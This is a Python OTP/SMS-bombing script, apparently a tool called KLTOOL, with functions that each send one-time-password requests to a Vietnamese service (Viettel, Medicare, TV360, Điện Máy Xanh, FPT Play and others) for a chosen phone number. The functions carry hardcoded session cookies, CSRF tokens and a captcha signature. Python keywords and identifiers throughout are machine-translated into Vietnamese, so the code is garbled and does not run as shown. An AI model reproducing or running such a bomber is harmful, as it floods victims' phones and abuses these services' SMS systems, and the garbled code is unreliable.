yêu cầu nhập khẩu
thời gian nhập khẩu
nhập json
nhập khẩu hệ thống
nhập khẩu ngẫu nhiên
nhập chuỗi
nhập khẩu hệ điều hành
từ requests.adapters nhập HTTPAdapter
từ urllib3.util.retry nhập Thử lại
nhập khẩu luồng
từ thời gian nhập khẩu giấc ngủ
# apiby @dothanh1110 (tôn trọng chút thì đừng xóa)
# web: ctdotech.tech

# Danh sách các tên, đệm và tên phổ biến
Last_names = ['Nguyễn', 'Trần', 'Lê', 'Phạm', 'Vũ', 'Hoàng']
middle_names = ['Văn', 'Thị', 'Quang', 'Hoàng', 'Anh', 'Thanh']
first_names = ['Nam', 'Tuấn', 'Hương', 'Linh', 'Long', 'Duy']

# Tạo tên ngẫu nhiên
định nghĩa generate_random_name():
    last_name = random.choice(last_names)
    middle_name = random.choice(middle_names) if random.choice([True, False]) else '' # Tên đệm tùy chọn
    first_name = random.choice(first_names)
    trả về f"{họ} {tên đệm} {tên}".strip()


định nghĩa generate_random_id():
    def random_segment(chiều dài):
        trả về ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
    
    trả về f"{phân_đoạn_ngẫu_nhiên(2)}7D7{phân_đoạn_ngẫu_nhiên(1)}6{phân_đoạn_ngẫu_nhiên(1)}E-D52E-46EA-8861-ED{phân_đoạn_ngẫu_nhiên(1)}BB{phân_đoạn_ngẫu_nhiên(2)}86{phân_đoạn_ngẫu_nhiên(3)}"

định nghĩa generate_random_id():
    trả về ''.join(random.choices(string.ascii_uppercase + string.digits, k=32))

định dạng_id_thiết_bị(id_thiết_bị):
    trả về f"{device_id[:8]}-{device_id[8:12]}-{device_id[12:16]}-{device_id[16:20]}-{device_id[20:]}"

random_id = tạo_random_id()
định dạng_id_thiết_bị = định dạng_id_thiết_bị(id_ngẫu_nhiên)


#/////////////////////////

trang = "\033[1;37m\033[1m"
xanh_la = "\033[1;32m\033[1m"
xanh_dương = "\033[1;34m\033[1m"
xanhnhat = '\033[1m\033[38;5;51m'
làm = "\033[1;31m\033[1m\033[1m"
xam='\033[1;30m\033[1m'
vang = "\033[1;33m\033[1m"
tim = "\033[1;35m\033[1m"
hongnhat = "#FFC0CB"
kt_code = "</>"
dac_biet = "\033[32;5;245m\033[1m\033[38;5;39m"
vua = "\033[1;31m\033[1m\033[1m[\033[1;37m\033[1m=.=\033[1;31m\033[1m\033[1m] \033[1 ;37m\033[1m=> \033[1;32m\033[1m"


# Hiển thị banner
banner = """
\033[1;32m██╗░░██╗██╗░░░░░████████╗░█████╗░░█████╗░██╗░░░░░
\033[1;33m██║░██╔╝██║░░░░░╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░
\033[1;34m█████═╝░██║░░░░░░░░██║░░░██║░░██║██║░░██║██║░░░░░
\033[1;35m██╔═██╗░██║░░░░░░░░██║░░░██║░░██║██║░░██║██║░░░░░
\033[1;36m██║░╚██╗███████╗░░░██║░░░╚█████╔╝╚█████╔╝███████╗
\033[1;31m╚═╝░░╚═╝╚══════╝░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝
"""

# Xóa màn hình
os.system('cls' if os.name == 'nt' else 'clear')

# Hiển thị banner
print(banner)

def send_otp_via_sapo(sdt):
    bánh quy = {
        'landing_page': 'https://www.sapo.vn/',
        'start_time': '30/07/2024 16:21:32',
        'lang': 'vi',
        'G_ENABLED_IDPS': 'google',
        'nguồn': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
        'giới thiệu': 'https://accounts.sapo.vn/',
        'lượt xem trang': '7',
    }

    tiêu đề = {
        'chấp nhận': '*/*',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'dnt': '1',
        'nguồn gốc': 'https://www.sapo.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng nguồn gốc',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    dữ liệu = {
        'số điện thoại': sdt,
    }

    phản hồi = yêu cầu.post('https://www.sapo.vn/fnb/sendotp', cookie=cookies, headers=headers, data=data)


# _ _ _ _
# (_) | | | | |
# __ __ _ ___ | |_ | |_ ___ | |
# \ \ / / | | / _ \ | __| | __| / _ \ | |
# \ V / | | | __/ | |_ | |_ | __/ | |
# \_/ |_| \___| \__| \__| \___| |_|
#                                           
# https://viettel.vn                                        
def gửi_otp_qua_viettel(sdt):
    bánh quy = {
        'laravel_session': 'ubn0cujNbmoBY3ojVB6jK1OrX0oxZIvvkqXuFnEf',
        'redirectLogin': 'https://viettel.vn/myviettel',
        'XSRF-TOKEN': 'eyJpdiI6ImxkRklPY1FUVUJvZlZQQ01oZ1MzR2c9PSIsInZhbHVlIjoiWUhoVXVBWUhkYmJBY0JieVZEOXRPNHorQ2NZZURKdnJiVDRmQVF2SE9nSEQ0a0ZuVGUw WEVDNXp0K0tiMWRlQyIsIm1hYyI6ImQ1NzFjNzU3ZGM3ZDNiNGMwY2NmODE3NGFkN2QxYzI0YTRhMTIxODAzZmM3YzYwMDllYzNjMTc1M2Q1MGMwM2EifQ%3D%3D',
    }

    tiêu đề = {
        'Chấp nhận': 'application/json, text/plain, */*',
        'Ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'Kết nối': 'duy trì kết nối',
        'Content-Type': 'application/json;charset=UTF-8',
        'DNT': '1',
        'Nguồn gốc': 'https://viettel.vn',
        'Người giới thiệu': 'https://viettel.vn/myviettel',
        'Sec-Fetch-Dest': 'trống',
        'Chế độ lấy giây': 'cors',
        'Sec-Fetch-Site': 'cùng nguồn gốc',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'X-CSRF-TOKEN': 'H32gw4ZAkTzoN8PdQkH3yJnn2wvupVCPCGx4OC4K',
        'X-Yêu cầu-Với': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6ImxkRklPY1FUVUJvZlZQQ01oZ1MzR2c9PSIsInZhbHVlIjoiWUhoVXVBWUhkYmJBY0JieVZEOXRPNHorQ2NZZURKdnJiVDRmQVF2SE9nSEQ0a0ZuVGUwWEVDNXp0K0tiMWRlQyIsIm1hYyI6ImQ1NzFjNzU3ZGM3ZDNiNGMwY2NmODE3NGFkN2QxYzI0YTRhMTIxODAzZmM3YzYwMDllYzNjMTc1M2Q1MGMwM2EifQ==',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    dữ liệu json = {
        'điện thoại': sdt,
        'typeCode': 'DI_DONG',
        'mã hành động': 'myviettel://login_mobile',
        'kiểu': 'otp_login',
    }

    phản hồi = yêu cầu.post('https://viettel.vn/api/getOTPLoginCommon', cookie=cookies, headers=headers, json=json_data)
    









# https://medicare.vn                                          
# | | (_)                             
# _ __ ___ ___ __| | _ ___ __ _ _ __ ___
# | '_ ` _ \ / _ \ / _` | | | / __| / _` | | '__| / _ \
# | | | | | | | __/ | (_| | | | | (__ | (_| | | | | __/
# |_| |_| |_| \___| \__,_| |_| \___| \__,_| |_| \___|
                                                        



def send_otp_via_medicare(sdt):
    bánh quy = {
        'MÁY CHỦ': 'nginx2',
        '_gcl_au': '1.1.481698065.1722327865',
        '_tt_enable_cookie': '1',
        '_ttp': 'sCpx7m_MUB9D7tZklNI1kEjX_05',
        '_gid': 'GA1.2.1931976026.1722327868',
        '_ga_CEMYNHNKQ2': 'GS1.1.1722327866.1.1.1722327876.0.0.0',
        '_ga_8DLTVS911W': 'GS1.1.1722327866.1.1.1722327876.0.0.0',
        '_ga_R7XKMTVGEW': 'GS1.1.1722327866.1.1.1722327876.50.0.0',
        '_ga': 'GA1.2.535777579.1722327867',
        'XSRF-TOKEN': 'eyJpdiI6ImFZV0RqYTlINlhlL0FrUEdIaEdsSVE9PSIsInZhbHVlIjoiZkEvVFhpb0VYbC85RTJtNklaWXJONE1oSEFzM2JMdjdvRlBseENjN3VKRzlmelRaVFFHc2JDTE42UkxCRnhTd3Z5RHJmYVZvblVBZCs1dDRvSk5lemV tRUlYM1Uzd1RqV0YydEpVaWJjb2oyWlpvekhDRHBVREZQUVF0cTdhenkiLCJtYWMiOiIyZjUwNDcyMmQzODEwN jUzOTg3YmJhY2ZhZTY2YmM2ODJhNzUwOTE0YzdlOWU5MmYzNWViM2Y0MzNlODM5Y2MzIiwidGFnIjoiIn0%3D',
        'medicare_session': 'eyJpdiI6InRFQ2djczdiTDRwTHhxak8wcTZnZVE9PSIsInZhbHVlIjoiZW8vM0ZRVytldlR1Y0M1SFZYYlVvN3NrN0x6UmFXQysyZW5FbTI2WnBCUXV1RE5qbCtPQ1I0YUJnSzR4M1FUYkRWaDUvZVZVRkZ4eEU4TWlGL2JNa3N mKzE1bFRiaHkzUlB0TXN0UkN6SW5ZSjF2dG9sODZJUkZyL3FnRkk1NE8iLCJtYWMiOiJmZGIyNTNkMjcyNGUxN GY0ZjQwZjBiY2JjYmZhMGE1Y2Q1NTBlYjI3OWM2MTQ0YTViNDU0NjA5YThmNDQyMzYwIiwidGFnIjoiIn0%3D',
    }

    tiêu đề = {
        'Chấp nhận': 'application/json, text/plain, */*',
        'Ngôn ngữ chấp nhận': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
        'Kết nối': 'duy trì kết nối',
        'Loại nội dung': 'ứng dụng/json',
        # 'Cookie': 'SERVER=nginx2; _gcl_au=1.1.481698065.1722327865; _tt_enable_cookie=1; _ttp=sCpx7m_MUB9D7tZklNI1kEjX_05; _gid=GA1.2.1931976026.1722327868; _ga_CEMYNHNKQ2=GS1.1.1722327866.1.1.1722327876.0.0.0; _ga_8DLTVS911W=GS1.1.1722327866.1.1.1722327876.0.0.0; _ga_R7XKMTVGEW=GS1.1.1722327866.1.1.1722327876.50.0.0; _ga=GA1.2.535777579.1722327867; XSRF-TOKEN=eyJpdiI6ImFZV0RqYTlINlhlL0FrUEdIaEdsSVE9PSIsInZhbHVlIjoiZkEvVFhpb0VYbC85RTJtNklaWXJONE1oSEFzM2JMdjdvRlBseENjN3VKRzlmelRaVFFHc2JDTE42UkxCRnhTd3Z5RHJmYVZvblVBZCs1dDRvSk 5lemVtRUlYM1Uzd1RqV0YydEpVaWJjb2oyWlpvekhDRHBVREZQUVF0cTdhenkiLCJtYWMiOiIyZjUwNDcyMmQzOD EwNjUzOTg3YmJhY2ZhZTY2YmM2ODJhNzUwOTE0YzdlOWU5MmYzNWViM2Y0MzNlODM5Y2MzIiwidGFnIjoiIn0%3D; medicare_session=eyJpdiI6InRFQ2djczdiTDRwTHhxak8wcTZnZVE9PSIsInZhbHVlIjoiZW8vM0ZRVytldlR1Y0M1SFZYYlVvN3NrN0x6UmFXQysyZW5FbTI2WnBCUXV1RE5qbCtPQ1I0YUJnSzR4M1FUYkRWaDUvZVZVRkZ4eEU4TWl GL2JNa3NmKzE1bFRiaHkzUlB0TXN0UkN6SW5ZSjF2dG9sODZJUkZyL3FnRkk1NE8iLCJtYWMiOiJmZGIyNTNkMjcyN GUxNGY0ZjQwZjBiY2JjYmZhMGE1Y2Q1NTBlYjI3OWM2MTQ0YTViNDU0NjA5YThmNDQyMzYwIiwidGFnIjoiIn0%3D',
        'Nguồn gốc': 'https://medicare.vn',
        'Người giới thiệu': 'https://medicare.vn/login',
        'Sec-Fetch-Dest': 'trống',
        'Chế độ lấy giây': 'cors',
        'Sec-Fetch-Site': 'cùng nguồn gốc',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/125.0.0.0 Safari/537.36',
        'X-XSRF-TOKEN': 'eyJpdiI6ImFZV0RqYTlINlhlL0FrUEdIaEdsSVE9PSIsInZhbHVlIjoiZkEvVFhpb0VYbC85RTJtNklaWXJONE1oSEFzM2JMdjdvRlBseENjN3VKRzlmelRaVFFHc2JDTE42UkxCRnhTd3Z5RHJmYVZvblVBZCs1dDRvSk5lem VtRUlYM1Uzd1RqV0YydEpVaWJjb2oyWlpvekhDRHBVREZQUVF0cTdhenkiLCJtYWMiOiIyZjUwNDcyMmQzODEwNjUzOTg3YmJhY2ZhZTY2YmM2ODJhNzUwOTE0YzdlOWU5MmYzNWViM2Y0MzNlODM5Y2MzIiwidGFnIjoiIn0=',
        'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Không phải thương hiệu";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    dữ liệu json = {
        'di động': sdt,
        'mobile_country_prefix': '84',
    }

    phản hồi = yêu cầu.post('https://medicare.vn/api/otp', cookie=cookies, headers=headers, json=json_data)
    



định nghĩa send_otp_via_tv360(sdt):

    bánh quy = {
        'img-ext': 'avif',
        'NEXT_LOCALE': 'vi',
        'phiên-id': 's%3A472d7db8-6197-442e-8276-7950defb8252.rw16I89Sh%2FgHAsZGV08bm5ufyEzc72C%2BrohCwXTEiZM',
        'device-id': 's%3Aweb_89c04dba-075e-49fe-b218-e33aef99dd12.i%2B3tWDWg0gEx%2F9ZDkZOcqpgNoqXOVGgL%2FsNf%2FZlMPPg',
        'shared-device-id': 'web_89c04dba-075e-49fe-b218-e33aef99dd12',
        'kích thước màn hình': 's%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q',
        'G_ENABLED_IDPS': 'google',
    }

    tiêu đề = {
        'chấp nhận': 'ứng dụng/json, văn bản/thuần túy, */*',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'kiểu-nội-dung': 'ứng-dụng/json',
        # 'cookie': 'img-ext=avif; NEXT_LOCALE=vi; session-id=s%3A472d7db8-6197-442e-8276-7950defb8252.rw16I89Sh%2FgHAsZGV08bm5ufyEzc72C%2BrohCwXTEiZM; device-id=s%3Aweb_89c04dba-075e-49fe-b218-e33aef99dd12.i%2B3tWDWg0gEx%2F9ZDkZOcqpgNoqXOVGgL%2FsNf%2FZlMPPg; shared-device-id=web_89c04dba-075e-49fe-b218-e33aef99dd12; kích thước màn hình=s%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q; G_ENABLED_IDPS=google',
        'dnt': '1',
        'nguồn gốc': 'https://tv360.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://tv360.vn/login?r=https%3A%2F%2Ftv360.vn%2F',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng nguồn gốc',
        'thời gian bắt đầu': '1722324791163',
        'tz': 'Châu Á/Bangkok',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    dữ liệu json = {
        'msisdn': sdt,
    }

    phản hồi = yêu cầu.post('https://tv360.vn/public/v1/auth/get-otp-login', cookie=cookies, headers=headers, json=json_data)
    



#++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ +++++

def send_otp_via_dienmayxanh(sdt):
    bánh quy = {
        'TBMCookie_3209819802479625248': '657789001722328509llbPvmLFf7JtKIGdRJGS7vFlx2E=',
        '___utmvm': '###########',
        '___utmvc': "navigator%3Dtrue, navigator.vendor%3DGoogle%20Inc., navigator.appName%3DNetscape, navigator.plugins.length%3D%3D0%3Dfalse, navigator.platform%3DWin32, navigator.webdriver%3Dfalse, plugin_ext%3Dno%20extention, ActiveXObject%3Dfalse, webkitURL%3Dtrue,_phantom%3Dfalse, callPhantom%3Dfalse, chrome%3Dtrue, yandex%3Dfalse, opera%3Dfalse, opr%3Dfalse, safari%3Dfalse, awesomium%3Dfalse, puffinDevice%3Dfalse, __nightmare%3Dfalse, domAutomation%3Dfalse, domAutomationCon troller%3Dsai,_Selenium_IDE_Recorder%3Dsai,document.__webdriver_script_fn%3Dsai,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dsai,process.version%3Dsai,navigator.cpuClass%3Dsai,navigator.oscpu%3Dsai,navigator.connection%3Dđúng,navigator.language%3D%3D'C'%3Dsai,window.outerWidth%3D%3D0%3Dsai,window.outerHeight%3D%3D0%3Dsai,window.WebGLRenderingContext%3Dđúng,document.documentMode%3Dchưa xác định,eval.toString().length%3D33,digest=",
        'SvID': 'new2690|Zqilx|Zqilw',
        'mwgngxpv': '3',
        '.AspNetCore.Antiforgery.SuBGfRYNAsQ': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5TQ7UQGmBzPEH6s6-tzBBTiKEgcfjZWXpY8_IL-DTacK3it55OPdd dwuXNc2mgQzfoEMl9eFbSuvHz3ySnzPW-Ww4YccqMERZSMCsSY8f1eBwOpd9HzD1YsnrhTwgAuLxM',
        'DMX_Personal': '%7B%22UID%22%3A%225cb3bf4ae0e8e527f2e3813bf976bee79ea330dc%22%2C%22ProvinceId%22%3A3%2C%22Địa chỉ%22%3Anull%2C%22Culture%22%3A%22vi-3%22 %2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22 %3Anull%2C%22CRMTùy chỉnh merId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22Custom erIdentity%22%3Anull%2C%22Ngày sinh của khách hàng%22%3Anull%2C%22Địa chỉ khách hàng%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
    }

    tiêu đề = {
        'Chấp nhận': '*/*',
        'Ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'Kết nối': 'duy trì kết nối',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': "TBMCookie_3209819802479625248=657789001722328509llbPvmLFf7JtKIGdRJGS7vFlx2E=; ___utmvm=###########; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomatio nController%3Dsai,_Selenium_IDE_Recorder%3Dsai,document.__webdriver_script_fn%3Dsai,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dsai,process.version%3Dsai,navigator.cpuClass%3Dsai,navigator.oscpu%3Dsai,navigator.connection%3Dđúng,navigator.language%3D%3D'C'%3Dsai,window.outerWidth%3D%3D0%3Dsai,window.outerHeight%3D%3D0%3Dsai,window.WebGLRenderingContext%3Dđúng,document.documentMode%3Dchưa xác định,eval.toString().length%3D33,digest=; SvID=new2690|Zqilx|Zqilw; mwgngxpv=3; .AspNetCore.Antiforgery.SuBGfRYNAsQ=CfDJ8LmkDaXB2QlCm0k7EtaCd5TQ7UQGmBzPEH6s6-tzBBTiKEgcfjZWXpY8 _IL-DTacK3it55OPdddwuXNc2mgQzfoEMl9eFbSuvHz3ySnzPW-Ww4YccqMERZSMCsSY8f1eBwOpd9HzD1YsnrhTwgAuLxM; DMX_Personal=%7B%22UID%22%3A%225cb3bf4ae0e8e527f2e3813bf976bee79ea330dc%22%2C%22ProvinceId%22%3A3%2C%22Địa chỉ%22%3Anull%2C%22Culture%22%3A% 22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2 C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22Mã phiếu giảm giá%22%3Anull%2C%22CR MCustomerId%22%3Hủy%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Hủy%2C%22CustomerPhone%22%3Hủy%2C%22CustomerEmail%22%3Hủy%2C%22CustomerIdentity%22%3Hủy%2C%22CustomerBirthday%22%3Hủy%2C%22CustomerAddress%22%3Hủy%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D",
        'DNT': '1',
        'Nguồn gốc': 'https://www.dienmayxanh.com',
        'Người giới thiệu': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
        'Sec-Fetch-Dest': 'trống',
        'Chế độ lấy giây': 'cors',
        'Sec-Fetch-Site': 'cùng nguồn gốc',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'X-Yêu cầu-Với': 'XMLHttpRequest',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    dữ liệu = {
        'số điện thoại': sdt,
        'isReSend': 'sai',
        'gửiOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5Ri89ZiNhfmFcY9XtYAjjDirvSdcYRdWZG8hw_ch4w5eMUQc0d_fRDOu0QzDWE_fHeK8txJRRqbPmgZ61U70owDeZCkCDABV3jc45D8wyJ5wfbHpS-0YjALBHW3TKFiAxU',
    }

    phản hồi = yêu cầu.đăng(
        'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
        cookie=cookie,
        headers=tiêu đề,
        dữ liệu=dữ liệu,
    )

    



def send_otp_via_kingfoodmart(sdt):
    tiêu đề = {
        'chấp nhận': '*/*',
        'ngôn ngữ chấp nhận': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
        'ủy quyền': '',
        'kiểu-nội-dung': 'ứng-dụng/json',
        'tên miền': 'kingfoodmart',
        'nguồn gốc': 'https://kingfoodmart.com',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://kingfoodmart.com/',
        'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Không phải thương hiệu";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/125.0.0.0 Safari/537.36',
    }

    dữ liệu json = {
        'operationName': 'GửiOtp',
        'biến': {
            'đầu vào': {
                'điện thoại': sdt,
                'captchaSignature': 'HFMWt2IhJSLQ4zZ39DH0FSHgMLOxYwQwwZegMOc2R2RQwIQypiSQULVRtGIjBfOCdVY2k1VRh0VRgJFidaNSkFWlMJSF1kO2FNHkJkZk40DVBVJ2VuHmIiQy4AL15HVRhxWRcIGXcoCVYqWGQ2NWoPUxoAcGoNOQESVj1PIhUiUEosSlwHPEZ1BXlYOXVIOXQbEWJRGWkjWAkCUysD',
            },
        },
        'query': 'đột biến SendOtp($input: SendOtpInput!) {\n sendOtp(input: $input) {\n otpTrackingId\n __typename\n }\n}',
    }

    phản hồi = yêu cầu.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data)


    


def send_otp_via_mocha(sdt):
    tiêu đề = {
    'Chấp nhận': 'application/json, text/plain, */*',
    'Ngôn ngữ chấp nhận': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Kiểm soát bộ nhớ đệm': 'không có bộ nhớ đệm',
    'Kết nối': 'duy trì kết nối',
        # 'Độ dài nội dung': '0',
    'Nguồn gốc': 'https://video.mocha.com.vn',
    'Pragma': 'không có bộ nhớ đệm',
    'Người giới thiệu': 'https://video.mocha.com.vn/',
    'Sec-Fetch-Dest': 'trống',
    'Chế độ lấy giây': 'cors',
    'Sec-Fetch-Site': 'cùng một trang web',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Không phải/Một) Thương hiệu";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    }

    tham số = {
    'msisdn': sdt,
    'Mã ngôn ngữ': 'vi',
    }

    phản hồi = yêu cầu. bài đăng ('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers)


    

định nghĩa send_otp_via_fptdk(sdt):
    tiêu đề = {
        'chấp nhận': 'ứng dụng/json, văn bản/thuần túy, */*',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json; charset=UTF-8',
        'dnt': '1',
        'nguồn gốc': 'https://fptplay.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://fptplay.vn/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-đã làm': 'A0EB7FD5EA287DBF',
    }

    dữ liệu json = {
        'điện thoại': sdt,
        'country_code': 'VN',
        'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
    }

    phản hồi = yêu cầu.đăng(
        'https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=HvBYCEmniTEnRLxYzaiHyg&e=1722340953&device=Microsoft%20Edge(version%253A127.0.0.0)&drm=1',
        headers=tiêu đề,
        json=dữ liệu json,
    )
    

def send_otp_via_fptmk(sdt): # là quên pass ở fps á
    bánh quy = {
        'auth.strategy': '',
        'hết hạn_chào mừng': '14400',
        'fpt_uuid': '%226b6e6e3c-9275-43ef-8c91-0d2aea2753e1%22',
        'ajs_group_id': 'null',
        'G_ENABLED_IDPS': 'google',
        'CDP_ANONYMOUS_ID': '1722362340735',
        'CDP_USER_ID': '1722362340735',
    }

    tiêu đề = {
        'chấp nhận': '*/*',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        # 'cookie': 'auth.strategy=; expire_welcome=14400; fpt_uuid=%226b6e6e3c-9275-43ef-8c91-0d2aea2753e1%22; ajs_group_id=null; G_ENABLED_IDPS=google; CDP_ANONYMOUS_ID=1722362340735; CDP_USER_ID=1722362340735',
        'dnt': '1',
        'người giới thiệu': 'https://fptplay.vn/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'kịch bản',
        'sec-fetch-mode': 'không có cors',
        'sec-fetch-site': 'cùng nguồn gốc',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    phản hồi = yêu cầu.get(
        'https://fptplay.vn/_nuxt/pages/block/_type/_id.26.0382316fc06b3038d49e.js',
        cookie=cookie,
        headers=tiêu đề,
    )


    tiêu đề = {
        'chấp nhận': 'ứng dụng/json, văn bản/thuần túy, */*',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json; charset=UTF-8',
        'dnt': '1',
        'nguồn gốc': 'https://fptplay.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://fptplay.vn/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
